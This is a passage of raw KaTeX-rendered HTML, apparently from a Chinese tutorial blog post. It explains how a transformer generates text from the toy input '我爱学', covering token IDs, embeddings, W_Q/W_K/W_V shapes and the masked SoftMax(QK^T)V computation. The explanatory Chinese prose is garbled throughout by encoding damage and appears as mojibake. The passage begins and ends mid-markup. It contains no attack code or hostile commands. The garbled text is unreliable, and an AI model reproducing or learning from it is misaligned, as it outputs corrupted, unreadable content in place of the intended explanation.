class="mord"><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">01</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span></span></span><span style="top:-4.81em;"><span class="pstrut" style="height:3em;"/><span class="mord"><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">11</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span></span></span><span style="top:-3.61em;"><span class="pstrut" style="height:3em;"/><span class="mord"><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">21</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span></span></span><span style="top:-2.41em;"><span class="pstrut" style="height:3em;"/><span class="mord"><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">31</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span></span></span><span style="top:-1.21em;"><span class="pstrut" style="height:3em;"/><span class="mord"><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">41</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span></span></span><span style="top:-0.01em;"><span class="pstrut" style="height:3em;"/><span class="mord"><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">51</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:3.35em;"><span/></span></span></span></span><span class="arraycolsep" style="width:0.5em;"/><span class="arraycolsep" style="width:0.5em;"/><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:3.85em;"><span style="top:-6.01em;"><span class="pstrut" style="height:3em;"/><span class="mord"><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">02</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span></span></span><span style="top:-4.81em;"><span class="pstrut" style="height:3em;"/><span class="mord"><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">12</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span></span></span><span style="top:-3.61em;"><span class="pstrut" style="height:3em;"/><span class="mord"><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">22</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span></span></span><span style="top:-2.41em;"><span class="pstrut" style="height:3em;"/><span class="mord"><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">32</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span></span></span><span style="top:-1.21em;"><span class="pstrut" style="height:3em;"/><span class="mord"><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">42</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span></span></span><span style="top:-0.01em;"><span class="pstrut" style="height:3em;"/><span class="mord"><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">52</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:3.35em;"><span/></span></span></span></span><span class="arraycolsep" style="width:0.5em;"/><span class="arraycolsep" style="width:0.5em;"/><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:3.85em;"><span style="top:-6.01em;"><span class="pstrut" style="height:3em;"/><span class="mord"><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">03</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span></span></span><span style="top:-4.81em;"><span class="pstrut" style="height:3em;"/><span class="mord"><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">13</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span></span></span><span style="top:-3.61em;"><span class="pstrut" style="height:3em;"/><span class="mord"><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">23</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span></span></span><span style="top:-2.41em;"><span class="pstrut" style="height:3em;"/><span class="mord"><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">33</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span></span></span><span style="top:-1.21em;"><span class="pstrut" style="height:3em;"/><span class="mord"><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">43</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span></span></span><span style="top:-0.01em;"><span class="pstrut" style="height:3em;"/><span class="mord"><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">53</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:3.35em;"><span/></span></span></span></span><span class="arraycolsep" style="width:0.5em;"/><span class="arraycolsep" style="width:0.5em;"/><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:3.85em;"><span style="top:-6.01em;"><span class="pstrut" style="height:3em;"/><span class="mord"><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">04</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span></span></span><span style="top:-4.81em;"><span class="pstrut" style="height:3em;"/><span class="mord"><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">14</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span></span></span><span style="top:-3.61em;"><span class="pstrut" style="height:3em;"/><span class="mord"><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">24</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span></span></span><span style="top:-2.41em;"><span class="pstrut" style="height:3em;"/><span class="mord"><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">34</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span></span></span><span style="top:-1.21em;"><span class="pstrut" style="height:3em;"/><span class="mord"><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">44</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span></span></span><span style="top:-0.01em;"><span class="pstrut" style="height:3em;"/><span class="mord"><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">54</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:3.35em;"><span/></span></span></span></span></span></span><span class="mclose"><span class="delimsizing mult"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:3.85em;"><span style="top:-5.8499em;"><span class="pstrut" style="height:9.2em;"/><span style="width:0.667em;height:7.200em;"><svg xmlns="http://www.w3.org/2000/svg" width="0.667em" height="7.200em" viewbox="0 0 667 7200"><path d="M347 1759 V0 H0 V84 H263 V1759 v3600 v1759 H0 v84 H347z&#10;M347 1759 V0 H263 V1759 v3600 v1759 h84z"/></svg></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:3.35em;"><span/></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"/><span class="mopen">[</span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">0</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">3</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">4</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">5</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span><span class="mclose">]</span></span></span></span></span></div>
<h4 data-id="heading-3">1.2 ç”Ÿæˆè¿‡ç¨‹</h4>
<p><strong>è¾“å…¥ï¼š</strong> æˆ‘çˆ±å­¦</p>
<p><strong>æ¨¡å‹é¢„æœŸè¾“å‡ºï¼š</strong> ä¹ !</p>
<p>ä¸‹é¢æˆ‘ä»¬æ¥å…·ä½“åˆ†ææ¨¡å‹æ˜¯æ€ä¹ˆç”Ÿæˆ<strong>ä¹ !</strong></p>
<ol>
<li>æ¨¡å‹é€šè¿‡è¯è¡¨<code>W</code>ï¼Œå°†è¾“å…¥æ–‡å­—è½¬æ¢ä¸º<code>token_ids=[[0, 1, 2]]</code>ï¼Œtoken_ids.shape=(1,3)=(batch_size, seq_len)</li>
<li>æ¨¡å‹é€šè¿‡è¯åµŒå…¥å±‚embeddingçŸ©é˜µ<code>E</code>ï¼Œå°†token_idsè½¬æ¢ä¸ºè¯å‘é‡è¡¨ç¤ºï¼Œe=\begin{bmatrix}\begin{bmatrix}x_0 &amp; x_1 &amp; x_2\end{bmatrix}\end{bmatrix}ï¼Œe.shape=(1,3,5)=(batch_size, seq_len, d_model)</li>
<li>æ¥ä¸‹æ¥éœ€è¦åŠ ä¸Šä½ç½®ç¼–ç ï¼Œä½†æ˜¯æˆ‘ä»¬çœç•¥è¿™ä¸ªè¿‡ç¨‹</li>
<li>ç»è¿‡Casual Self-Attentionï¼ˆMasked Self-Attentionï¼‰</li>
<li>æœ€åç»è¿‡Linear+SoftMaxè¿›è¡Œé‡‡æ ·</li>
</ol>
<h5 data-id="heading-4">1.2.1 Casual Self-Attention</h5>
<p>åœ¨æ¨¡æ‹Ÿçš„è¿™ä¸ªæ³¨æ„åŠ›æœºåˆ¶ä¸­ï¼Œæˆ‘ä»¬å½“å•å¤´æ³¨æ„åŠ›è¿›è¡Œæ¨¡æ‹Ÿ</p>
<p><strong>è¾“å…¥ï¼š</strong> çŸ©é˜µe=\begin{bmatrix}\begin{bmatrix}x_0 &amp; x_1 &amp; x_2\end{bmatrix}\end{bmatrix}ï¼Œe.shape=(1,3,5)</p>
<p><strong>çº¦å®šç¬¦å·ï¼š</strong></p>























<table><thead><tr><th/><th>W_Q</th><th>W_K</th><th>W_V</th></tr></thead><tbody><tr><td>æ¨¡æ‹Ÿä¸­çš„å½¢çŠ¶</td><td>(5,2)</td><td>(5,2)</td><td>(5,2)</td></tr><tr><td>å½¢å¼åŒ–çš„å½¢çŠ¶</td><td>(d_{model},d_q)</td><td>(d_{model},d_q)</td><td>(d_{model},d_v)</td></tr></tbody></table>
<p>å°†çŸ©é˜µ<code>e</code>åˆ†åˆ«é€šè¿‡W_Qï¼ŒW_Kï¼ŒW_Vçº¿æ€§å˜æ¢å¾—åˆ°Qï¼ŒKï¼ŒVçŸ©é˜µï¼ŒQ.shape=(3,2)ï¼ŒK.shape=(3,2)ï¼ŒV.shape=(3,2)</p>
<p>å†é€šè¿‡å…¬å¼SoftMax(Masked(QK^T))Vè®¡ç®—å¾—åˆ†</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/dd46d3916a3b4b968012b82b9547ee0e~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg55So5oi3OTkwMTkzMDUyNDU=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770891734&amp;x-signature=GHjsWaiF%2FOMzzAHlWJt98ceBE3M%3D" alt="image-20260205170031696.png" loading="lazy"/></p>
<p>è¿™é‡Œçš„<code>æˆ‘/æˆ‘</code>è¡¨ç¤ºä¸¤ä¸ªtokençš„ç›¸å…³æ€§Q[æˆ‘]*K[æˆ‘]</p>
<div class="math math-display"><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mi>Q</mi><msup><mi>K</mi><mi>T</mi></msup><mo>=</mo><mrow><mo fence="true">[</mo><mtable rowspacing="0.16em" columnalign="center center center" columnspacing="1em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><msub><mi>y</mi><mn>00</mn></msub></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><msub><mi>y</mi><mn>01</mn></msub></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><msub><mi>y</mi><mn>02</mn></msub></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><msub><mi>y</mi><mn>10</mn></msub></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><msub><mi>y</mi><mn>11</mn></msub></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><msub><mi>y</mi><mn>12</mn></msub></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><msub><mi>y</mi><mn>20</mn></msub></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><msub><mi>y</mi><mn>21</mn></msub></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><msub><mi>y</mi><mn>22</mn></msub></mstyle></mtd></mtr></mtable><mo fence="true">]</mo></mrow></mrow><annotation encoding="application/x-tex">QK^T = \begin{bmatrix} y_{00} &amp; y_{01} &amp; y_{02} \\ y_{10} &amp; y_{11} &amp; y_{12} \\ y_{20} &amp; y_{21} &amp; y_{22} \end{bmatrix}  </annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.0858em;vertical-align:-0.1944em;"/><span class="mord mathnormal">Q</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.07153em;">K</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8913em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.13889em;">T</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:3.6em;vertical-align:-1.55em;"/><span class="minner"><span class="mopen"><span class="delimsizing mult"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.05em;"><span style="top:-4.05em;"><span class="pstrut" style="height:5.6em;"/><span style="width:0.667em;height:3.600em;"><svg xmlns="http://www.w3.org/2000/svg" width="0.667em" height="3.600em" viewbox="0 0 667 3600"><path d="M403 1759 V84 H666 V0 H319 V1759 v0 v1759 h347 v-84&#10;H403z M403 1759 V0 H319 V1759 v0 v1759 h84z"/></svg></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:1.55em;"><span/></span></span></span></span></span><span class="mord"><span class="mtable"><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.05em;"><span style="top:-4.21em;"><span class="pstrut" style="height:3em;"/><span class="mord"><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">00</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span></span></span><span style="top:-3.01em;"><span class="pstrut" style="height:3em;"/><span class="mord"><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">10</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span></span></span><span style="top:-1.81em;"><span class="pstrut" style="height:3em;"/><span class="mord"><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">20</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:1.55em;"><span/></span></span></span></span><span class="arraycolsep" style="width:0.5em;"/><span class="arraycolsep" style="width:0.5em;"/><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.05em;"><span style="top:-4.21em;"><span class="pstrut" style="height:3em;"/><span class="mord"><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">01</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span></span></span><span style="top:-3.01em;"><span class="pstrut" style="height:3em;"/><span class="mord"><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">11</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span></span></span><span style="top:-1.81em;"><span class="pstrut" style="height:3em;"/><span class="mord"><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">21</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:1.55em;"><span/></span></span></span></span><span class="arraycolsep" style="width:0.5em;"/><span class="arraycolsep" style="width:0.5em;"/><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.05em;"><span style="top:-4.21em;"><span class="pstrut" style="height:3em;"/><span class="mord"><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">02</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" 